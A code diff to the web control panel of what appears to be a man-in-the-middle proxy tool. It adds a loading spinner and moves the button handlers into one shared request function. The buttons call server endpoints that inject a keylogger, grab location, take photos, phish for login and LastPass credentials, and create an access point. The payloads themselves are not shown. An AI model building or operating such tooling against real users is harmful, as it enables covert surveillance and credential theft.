@@ -12,6 +12,7 @@
       <!-- Default panel contents -->
       <div class="panel-heading">
         <h5>Proxy Controls</h5>
+        <div id="spinner" style="position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px;"></div>
       </div>
 
       <!-- List group -->
@@ -221,41 +222,89 @@
   </section>
 </div>
 <script type="text/javascript">
+  //for the spinner
+var opts = {
+          lines: 11 // The number of lines to draw
+        , length: 56 // The length of each line
+        , width: 14 // The line thickness
+        , radius: 81 // The radius of the inner circle
+        , scale: 1 // Scales overall size of the spinner
+        , corners: 1 // Corner roundness (0..1)
+        , color: '#000' // #rgb or #rrggbb or array of colors
+        , opacity: 0.15 // Opacity of the lines
+        , rotate: 0 // The rotation offset
+        , direction: 1 // 1: clockwise, -1: counterclockwise
+        , speed: 1 // Rounds per second
+        , trail: 60 // Afterglow percentage
+        , fps: 20 // Frames per second when using setTimeout() as a fallback for CSS
+        , zIndex: 2e9 // The z-index (defaults to 2000000000)
+        , className: 'spinner' // The CSS class to assign to the spinner
+        , top: '50%' // Top position relative to parent
+        , left: '50%' // Left position relative to parent
+        , shadow: false // Whether to render a shadow
+        , hwaccel: false // Whether to use hardware acceleration
+        , position: 'absolute' // Element positioning
+        }
+  var target = '' //the target for the spinner is set in document.ready
+  var spinner;
+  var handleGetRequest = function(endpoint) {
+      target.style.zIndex = 1000;
+      spinner.spin(target);
+      $.get( "/"+endpoint, function ( data ) { console.log(endpoint+': ', data); } )
+      .done(function() {
+        target.style.zIndex = 0;
+        spinner.stop()//stop the spinner
+      })
+  }
 
-  $("#startSimpleProxy").click( function () {
-    $.get( "/StartSimpleProxy", function ( data ) { console.log('StartSimpleProxy: ', data); } );
-  });
-  $("#triggerRedirects").click( function () {
-    $.get( "/TriggerRedirects", function ( data ) { console.log('Redirect: ', data); } );
-  });
-  $("#triggerBlocks").click( function () {
-    $.get( "/TriggerBlocks", function ( data ) { console.log('Blocking: ', data); } );
-  });
-  $("#triggerWolfPack").click( function () {
-    $.get( "/TriggerWolfPack", function ( data ) { } );
-  });
-  $("#keylogger").click(function() {
-    $.get( "/TriggerInjection?trigger=keylogger", function ( data ) { } );
-  })
-  $("#getLocation").click(function() {
-    $.get( "/TriggerInjection?trigger=getlocation", function ( data ) { } );
-  })
-  $("#takePhoto").click(function() {
-    $.get( "/TriggerInjection?trigger=takephoto", function ( data ) { } );
-  })
-  $("#requestLogin").click(function() {
-    $.get( "/TriggerInjection?trigger=requestlogin", function ( data ) { } );
-  })
-  $("#requestLastpass").click(function() {
-    $.get( "/TriggerInjection?trigger=requestlasspass", function ( data ) { } );
-  })
-  $("#createaccesspoint").click(function() {
-    $.get( "/CreateAccessPoint?name="+$("#apname").val(), function ( data ) { 
-      console.log(data.Output)
-      $("#wifiOutput").html("<b>Output: </b>", data.Output)
-      $("#wifiError").html("<b>Error: </b>", data.Error)
-    } );
-  })
+  $("#startSimpleProxy").click( function () { handleGetRequest("StartSimpleProxy")});
+
+  $("#triggerRedirects").click( function () { handleGetRequest("TriggerRedirects") });
+
+  $("#triggerBlocks").click( function () { handleGetRequest("TriggerBlocks") });
+
+  $("#triggerWolfPack").click( function () { handleGetRequest("TriggerWolfPack") });
+
+  $("#keylogger").click( function () { handleGetRequest("TriggerInjection?trigger=keylogger") });
+
+  $("#getLocation").click( function () { handleGetRequest("TriggerInjection?trigger=getlocation") });
+
+  $("#takePhoto").click( function () { handleGetRequest("TriggerInjection?trigger=takephoto") });
+
+  $("#requestLogin").click( function () { handleGetRequest("TriggerInjection?trigger=requestlogin") });
+
+  $("#requestLastpass").click( function () { handleGetRequest("TriggerInjection?trigger=requestlasspass") });
+
+  $("#createaccesspoint").click( function () { handleGetRequest("CreateAccessPoint?name="+$("#apname").val()) });
+
+  // $("#triggerBlocks").click( function () {
+  //   $.get( "/TriggerBlocks", function ( data ) { console.log('Blocking: ', data); } );
+  // });
+  // $("#triggerWolfPack").click( function () {
+  //   $.get( "/TriggerWolfPack", function ( data ) { } );
+  // });
+  // $("#keylogger").click(function() {
+  //   $.get( "/TriggerInjection?trigger=keylogger", function ( data ) { } );
+  // })
+  // $("#getLocation").click(function() {
+  //   $.get( "/TriggerInjection?trigger=getlocation", function ( data ) { } );
+  // })
+  // $("#takePhoto").click(function() {
+  //   $.get( "/TriggerInjection?trigger=takephoto", function ( data ) { } );
+  // })
+  // $("#requestLogin").click(function() {
+  //   $.get( "/TriggerInjection?trigger=requestlogin", function ( data ) { } );
+  // })
+  // $("#requestLastpass").click(function() {
+  //   $.get( "/TriggerInjection?trigger=requestlasspass", function ( data ) { } );
+  // })
+  // $("#createaccesspoint").click(function() {
+  //   $.get( "/CreateAccessPoint?name="+$("#apname").val(), function ( data ) { 
+  //     console.log(data.Output)
+  //     $("#wifiOutput").html("<b>Output: </b>", data.Output)
+  //     $("#wifiError").html("<b>Error: </b>", data.Error)
+  //   } );
+  // })
 
 
   // $("#deletehars").click(function() {
@@ -367,6 +416,9 @@ function captureKeyLogs() {
 $(document).ready(function() {
   initHarView();
   setTimeout(captureKeyLogs, 5000);
+  console.log(spinner)
+  target = document.getElementById('spinner');
+  spinner = new Spinner(opts);
 })
 
 </script>
